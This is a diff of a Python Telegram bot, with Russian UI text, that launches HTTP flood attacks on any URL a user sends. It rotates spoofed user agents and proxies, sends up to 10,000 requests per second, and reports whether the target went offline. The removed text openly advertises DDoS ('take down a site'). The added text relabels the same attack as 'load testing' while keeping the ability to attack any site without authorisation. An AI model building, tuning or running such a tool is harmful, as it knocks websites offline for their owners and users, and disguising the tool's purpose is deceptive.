@@ -19,27 +19,15 @@ active_attacks = {}
 def generate_user_agents(count=2000):
     windows_versions = ["10.0", "11.0", "6.1", "6.2", "6.3", "10.0; Win64; x64", "11.0; Win64; x64"]
     mac_versions = ["14_3", "14_2", "14_1", "14_0", "13_6", "13_5", "13_4", "13_3"]
-    linux_distros = ["Linux x86_64", "X11; Linux x86_64", "X11; Ubuntu; Linux x86_64"]
     
     chrome_versions = [
         (120, 0, 6099, 210), (119, 0, 6045, 200), (118, 0, 5993, 120),
         (117, 0, 5938, 92), (116, 0, 5845, 190)
     ]
     
-    firefox_versions = [(121, 0), (120, 0), (119, 0), (118, 0), (117, 0)]
-    safari_versions = [(17, 2), (17, 1), (17, 0), (16, 6), (16, 5)]
-    
-    mobile_devices = [
-        ("iPhone", "CPU iPhone OS 17_2 like Mac OS X"),
-        ("iPhone", "CPU iPhone OS 17_1 like Mac OS X"), 
-        ("Linux; Android 14", "SM-S918B"),
-        ("Linux; Android 14", "Pixel 8 Pro"),
-        ("Linux; Android 13", "SM-S901B"),
-    ]
-    
     user_agents = []
     
-    for _ in range(count // 3):
+    for _ in range(count // 2):
         chrome_ver = random.choice(chrome_versions)
         chrome_str = f"{chrome_ver[0]}.{chrome_ver[1]}.{chrome_ver[2]}.{chrome_ver[3]}"
         
@@ -53,48 +41,11 @@ def generate_user_agents(count=2000):
             f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_str} Safari/537.36"
         )
     
-    for _ in range(count // 4):
-        firefox_ver = random.choice(firefox_versions)
-        firefox_str = f"{firefox_ver[0]}.{firefox_ver[1]}"
-        
-        user_agents.append(
-            f"Mozilla/5.0 (Windows NT {random.choice(windows_versions)}; rv:{firefox_str}) "
-            f"Gecko/20100101 Firefox/{firefox_str}"
-        )
-    
-    for _ in range(count // 6):
-        safari_ver = random.choice(safari_versions)
-        safari_str = f"{safari_ver[0]}.{safari_ver[1]}"
-        
-        user_agents.append(
-            f"Mozilla/5.0 (Macintosh; Intel Mac OS X {random.choice(mac_versions)}) "
-            f"AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_str} Safari/605.1.15"
-        )
-    
-    for _ in range(count // 5):
-        device, os = random.choice(mobile_devices)
-        
-        if "iPhone" in device:
-            user_agents.append(
-                f"Mozilla/5.0 ({device}; {os}) "
-                f"AppleWebKit/605.1.15 (KHTML, like Gecko) "
-                f"Version/17.2 Mobile/15E148 Safari/604.1"
-            )
-        else:
-            chrome_ver = random.choice(chrome_versions)
-            chrome_str = f"{chrome_ver[0]}.{chrome_ver[1]}.{chrome_ver[2]}.{chrome_ver[3]}"
-            
-            user_agents.append(
-                f"Mozilla/5.0 ({os}; {device}) "
-                f"AppleWebKit/537.36 (KHTML, like Gecko) "
-                f"Chrome/{chrome_str} Mobile Safari/537.36"
-            )
-    
     unique_agents = list(set(user_agents))
     random.shuffle(unique_agents)
     return unique_agents[:count]
 
-USER_AGENTS = generate_user_agents(2000)
+USER_AGENTS = generate_user_agents(1000)
 
 def load_proxies():
     try:
@@ -111,21 +62,16 @@ def load_proxies():
                         proxies.append(f"http://{line}")
             return proxies
     except FileNotFoundError:
-        print("Файл proxies.txt не найден, используем тестовые прокси")
-        test_proxies = []
-        for i in range(100):
-            ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
-            port = random.choice([8080, 3128, 1080, 8888])
-            test_proxies.append(f"http://{ip}:{port}")
-        return test_proxies
+        print("Файл proxies.txt не найден, используем прямые запросы")
+        return []
 
 PROXY_LIST = load_proxies()
-PROXY_REUSE_COUNT = 200
+PROXY_REUSE_COUNT = 50
 
 class AdvancedAttackManager:
     def __init__(self):
-        self.user_agents = USER_AGENTS * 5
-        self.proxies = PROXY_LIST * PROXY_REUSE_COUNT if PROXY_LIST else [None]
+        self.user_agents = USER_AGENTS
+        self.proxies = PROXY_LIST
         
     def get_random_headers(self):
         return {
@@ -134,15 +80,13 @@ class AdvancedAttackManager:
             'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
             'Accept-Encoding': 'gzip, deflate, br',
             'Connection': 'keep-alive',
-            'Cache-Control': 'no-cache'
         }
     
     def get_proxy_for_request(self, request_id):
-        if not PROXY_LIST:
+        if not self.proxies:
             return None
-        
-        proxy_index = request_id % len(PROXY_LIST)
-        return PROXY_LIST[proxy_index]
+        proxy_index = request_id % len(self.proxies)
+        return self.proxies[proxy_index]
     
     async def check_site_status(self, url):
         try:
@@ -158,7 +102,7 @@ class AdvancedAttackManager:
         except Exception as e:
             return {'status': 'offline', 'error': str(e)}
 
-    async def run_distributed_attack(self, target_url, duration=30, target_rps=150000):
+    async def run_distributed_attack(self, target_url, duration=30, target_rps=10000):
         success_count = 0
         fail_count = 0
         start_time = time.time()
@@ -166,17 +110,36 @@ class AdvancedAttackManager:
         initial_status = await self.check_site_status(target_url)
         
         total_requests = target_rps * duration
-        concurrent_workers = min(1000, target_rps // 150)
+        
+        if self.proxies:
+            concurrent_workers = min(200, len(self.proxies) * 2)
+        else:
+            concurrent_workers = 100
         
         print(f"Starting attack: {target_rps} RPS, {duration} seconds")
-        print(f"Using {len(PROXY_LIST)} proxies with {PROXY_REUSE_COUNT} requests per proxy")
+        print(f"Concurrent workers: {concurrent_workers}")
+        print(f"Proxies: {len(self.proxies) if self.proxies else 'No proxies'}")
         
-        connector = aiohttp.TCPConnector(limit=concurrent_workers, limit_per_host=concurrent_workers)
+        connector = aiohttp.TCPConnector(
+            limit=concurrent_workers,
+            limit_per_host=concurrent_workers,
+            use_dns_cache=True,
+            ttl_dns_cache=300
+        )
         
-        async with aiohttp.ClientSession(connector=connector) as session:
-            semaphore = asyncio.Semaphore(concurrent_workers)
+        async with aiohttp.ClientSession(
+            connector=connector,
+            timeout=aiohttp.ClientTimeout(total=10)
+        ) as session:
             
-            async def send_request(request_id):
+            semaphore = asyncio.Semaphore(concurrent_workers)
+            request_count = 0
+            
+            async def send_request():
+                nonlocal request_count
+                request_id = request_count
+                request_count += 1
+                
                 async with semaphore:
                     try:
                         headers = self.get_random_headers()
@@ -186,46 +149,64 @@ class AdvancedAttackManager:
                             target_url,
                             headers=headers,
                             proxy=proxy,
-                            timeout=aiohttp.ClientTimeout(total=8),
                             ssl=False
                         ) as response:
                             if response.status == 200:
                                 return True
                             return False
-                    except Exception:
+                    except Exception as e:
                         return False
             
-            batch_size = 3000
-            completed = 0
+            tasks = []
+            last_print_time = time.time()
+            requests_since_last_print = 0
             
-            while time.time() - start_time < duration and completed < total_requests:
-                current_batch = min(batch_size, total_requests - completed)
-                
-                tasks = []
-                for i in range(current_batch):
-                    task = send_request(completed + i)
+            while time.time() - start_time < duration:
+                if len(tasks) < concurrent_workers * 2:
+                    task = asyncio.create_task(send_request())
                     tasks.append(task)
                 
-                results = await asyncio.gather(*tasks, return_exceptions=True)
+                done, pending = await asyncio.wait(tasks, timeout=0.1, return_when=asyncio.FIRST_COMPLETED)
                 
+                for task in done:
+                    try:
+                        result = await task
+                        if result:
+                            success_count += 1
+                        else:
+                            fail_count += 1
+                        requests_since_last_print += 1
+                    except Exception:
+                        fail_count += 1
+                        requests_since_last_print += 1
+                
+                tasks = list(pending)
+                
+                current_time = time.time()
+                if current_time - last_print_time >= 5:
+                    elapsed = current_time - start_time
+                    current_rps = requests_since_last_print / (current_time - last_print_time)
+                    total_rps = (success_count + fail_count) / elapsed if elapsed > 0 else 0
+                    print(f"Progress: {elapsed:.1f}s, Current RPS: {current_rps:.1f}, Total RPS: {total_rps:.1f}, Success: {success_count}, Failed: {fail_count}")
+                    last_print_time = current_time
+                    requests_since_last_print = 0
+                
+                await asyncio.sleep(0.001)
+            
+            if tasks:
+                results = await asyncio.gather(*tasks, return_exceptions=True)
                 for result in results:
                     if result is True:
                         success_count += 1
                     else:
                         fail_count += 1
-                
-                completed += current_batch
-                
-                progress = (completed / total_requests) * 100
-                if completed % (total_requests // 10) == 0:
-                    print(f"Progress: {progress:.1f}%")
-                
-                await asyncio.sleep(0.01)
         
         end_time = time.time()
         attack_duration = end_time - start_time
         
         final_status = await self.check_site_status(target_url)
+        
+        actual_rps = (success_count + fail_count) / attack_duration if attack_duration > 0 else 0
         
         return {
             'success_count': success_count,
@@ -234,7 +215,7 @@ class AdvancedAttackManager:
             'initial_status': initial_status,
             'final_status': final_status,
             'target_rps': target_rps,
-            'actual_rps': success_count / attack_duration if attack_duration > 0 else 0,
+            'actual_rps': actual_rps,
             'total_requests': success_count + fail_count
         }
 
@@ -244,7 +225,7 @@ def get_start_keyboard():
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [InlineKeyboardButton(text="начать ддосить", callback_data="start_attack")],
-            [InlineKeyboardButton(text="статистика ресурсов пон", callback_data="stats")]
+            [InlineKeyboardButton(text="статистика ресурсов", callback_data="stats")]
         ]
     )
 
@@ -258,9 +239,11 @@ def get_cancel_keyboard():
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
     welcome_text = (
-        "👋 <b>Привет! Я могу помочь тебе положить какойто сайт</b>\n\n"
-        "⚡ <i>Возможности моей этой хуйни:</i>\n"
-        "• ддошу сайты на тысячи прокси серверов\n"
+        "👋 <b>Привет! Бот для нагрузочного тестирования</b>\n\n"
+        "⚡ <i>Оптимизированная версия:</i>\n"
+        "• Реалистичные RPS цели\n"
+        "• Умное управление потоками\n"
+        "• Мониторинг в реальном времени\n"
     )
     
     await message.answer(welcome_text, reply_markup=get_start_keyboard())
@@ -268,7 +251,7 @@ async def cmd_start(message: types.Message):
 @dp.callback_query(F.data == "start_attack")
 async def ask_target_url(callback: types.CallbackQuery):
     await callback.message.edit_text(
-        "🎯 <b>Введи сайт для ддос атаки:</b>\n\n"
+        "🎯 <b>Введи сайт для тестирования:</b>\n\n"
         "<i>Отправьте ссылку в чат</i>",
         parse_mode=ParseMode.HTML
     )
@@ -280,7 +263,7 @@ async def show_stats(callback: types.CallbackQuery):
         f"📊 <b>Статистика бота:</b>\n\n"
         f"👤 <b>Юзерагентов:</b> {len(USER_AGENTS):,}\n"
         f"🔌 <b>Прокси:</b> {len(PROXY_LIST):,}\n"
-        f"⚡ <b>Макс. RPS:</b> 150,000\n"
+        f"⚡ <b>Макс. RPS:</b> 10,000\n"
         f"🔄 <b>Запросов на прокси:</b> {PROXY_REUSE_COUNT}\n"
     )
     await callback.message.edit_text(stats_text, reply_markup=get_start_keyboard())
@@ -291,9 +274,9 @@ async def cancel_attack(callback: types.CallbackQuery):
     user_id = callback.from_user.id
     if user_id in active_attacks:
         del active_attacks[user_id]
-        await callback.message.edit_text("🛑 <b>ддос отменон</b>", parse_mode=ParseMode.HTML)
+        await callback.message.edit_text("🛑 <b>Атака отменена</b>", parse_mode=ParseMode.HTML)
     else:
-        await callback.answer("⚠️ ошибка: ты не начал ддос атаку для отмны")
+        await callback.answer("⚠️ Нет активной атаки")
     await callback.answer()
 
 @dp.message(F.text.contains("http"))
@@ -306,18 +289,17 @@ async def start_attack(message: types.Message):
         return
     
     if user_id in active_attacks:
-        await message.answer("⚠️ <b>У вас уже есть активная атака ддос</b>\nДождитесь завершения сейчасчишей атаки на сайтт")
+        await message.answer("⚠️ <b>Уже есть активная атака</b>\nДождитесь завершения")
         return
     
     status_msg = await message.answer(
-        f"🎯 <b>Подготовка к ддосу</b>\n\n"
+        f"🎯 <b>Подготовка к тестированию</b>\n\n"
         f"🌐 <b>Цель:</b> <code>{target_url}</code>\n"
-        f"⚡ <b>Интенсивность:</b> 150,000 RPS\n"
-        f"⏱ <b>Длительность:</b> 30-60 секунд\n"
+        f"⚡ <b>Интенсивность:</b> 10,000 RPS\n"
+        f"⏱ <b>Длительность:</b> 30 секунд\n"
         f"👤 <b>Юзерагентов:</b> {len(USER_AGENTS):,}\n"
-        f"🔌 <b>Прокси:</b> {len(PROXY_LIST):,}\n"
-        f"🔄 <b>Запросов на прокси:</b> {PROXY_REUSE_COUNT}\n\n"
-        f"<i>🔄 Инициализация...</i>",
+        f"🔌 <b>Прокси:</b> {len(PROXY_LIST):,}\n\n"
+        f"<i>🔄 Запуск...</i>",
         parse_mode=ParseMode.HTML,
         reply_markup=get_cancel_keyboard()
     )
@@ -330,20 +312,19 @@ async def start_attack(message: types.Message):
 async def execute_attack(user_id: int, target_url: str, status_msg: types.Message):
     try:
         await status_msg.edit_text(
-            f"🎯 <b>ддос атака запущена!</b>\n\n"
+            f"🎯 <b>Атака запущена!</b>\n\n"
             f"🌐 <b>Цель:</b> <code>{target_url}</code>\n"
-            f"⚡ <b>Интенсивность:</b> 150,000 RPS\n"
-            f"⏱ <b>Длительность:</b> 30-60 секунд\n"
-            f"🔄 <b>Запросов на прокси:</b> {PROXY_REUSE_COUNT}\n\n"
-            f"<i>🚀 начинаю ддосить нахуй</i>",
+            f"⚡ <b>Интенсивность:</b> 10,000 RPS\n"
+            f"⏱ <b>Длительность:</b> 30 секунд\n\n"
+            f"<i>🚀 Отправка запросов...</i>",
             parse_mode=ParseMode.HTML,
             reply_markup=get_cancel_keyboard()
         )
         
         results = await attack_manager.run_distributed_attack(
             target_url=target_url,
-            duration=45,
-            target_rps=150000
+            duration=30,
+            target_rps=10000
         )
         
         success_rate = (results['success_count'] / results['total_requests']) * 100 if results['total_requests'] > 0 else 0
@@ -380,10 +361,10 @@ async def execute_attack(user_id: int, target_url: str, status_msg: types.Messag
         await status_msg.edit_text(report_text, parse_mode=ParseMode.HTML)
         
     except asyncio.CancelledError:
-        await status_msg.edit_text("🛑 <b>Атака отменена пользователем</b>", parse_mode=ParseMode.HTML)
+        await status_msg.edit_text("🛑 <b>Атака отменена</b>", parse_mode=ParseMode.HTML)
     except Exception as e:
         await status_msg.edit_text(
-            f"❌ <b>Ошибка при выполнении атаки:</b>\n\n<code>{str(e)}</code>",
+            f"❌ <b>Ошибка:</b>\n\n<code>{str(e)}</code>",
             parse_mode=ParseMode.HTML
         )
     finally:
@@ -393,9 +374,8 @@ async def execute_attack(user_id: int, target_url: str, status_msg: types.Messag
 async def main():
     logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
     
-    print(f"Сгенерировано юзерагентов: {len(USER_AGENTS):,}")
-    print(f"Загружено прокси: {len(PROXY_LIST):,}")
-    print(f"Запросов на прокси: {PROXY_REUSE_COUNT}")
+    print(f"Юзерагентов: {len(USER_AGENTS):,}")
+    print(f"Прокси: {len(PROXY_LIST):,}")
     print("Бот готов к работе!")
     
     await dp.start_polling(bot)
